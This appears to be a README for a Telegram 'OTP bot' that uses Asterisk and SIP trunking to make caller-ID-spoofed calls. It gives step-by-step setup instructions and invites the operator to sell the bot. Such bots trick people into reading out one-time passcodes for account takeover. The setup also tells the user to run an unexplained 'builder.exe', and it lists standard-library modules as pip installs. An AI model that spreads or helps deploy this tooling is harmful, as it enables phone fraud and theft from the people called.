# OTP-Custom-API
Advanced Telegram OTP Bot With Spoofing And Custom SIP Voice API

**This Bot + API uses Asterisk and SIP trunking to make spoofed calls.**

Setup:

1. *Extract files.zip*

2. *Set your telegram bot token from @botfather, and your admin userid(to create keys) in settings.json*

3. *Download Python3.8.10 64bit* -> **https://www.python.org/ftp/python/3.8.10/python-3.8.10-amd64.exe**

4. *Execute:*

```pip install flask
pip install flask[async]
pip install python-telegram-bot
pip install asterisk-ami
pip install random
pip install requests
pip install datetime


5. *Open builder.exe and it starts compiling the source.*

**If you did everything correctly so far, you should see /assets folder and main.py & ami.py in the ouput.**

6. *View the /output folder and insert main.py and /assets folder into your VPS/RDP*

7. *To run the bot type "python3 main.py"*

8. *Now run the api with "python3 ami.py"*

9. *Go to your Bot @ and type /start*

And boom, there you have your own OTP bot you can start selling, make sure your SIP has balance to be able to make calls.

*IMPORTANT!* Make sure you set your SIP DETAILS in /assets folder inside sip.json

*SIP providers:* Narayana.im, Nullvoip
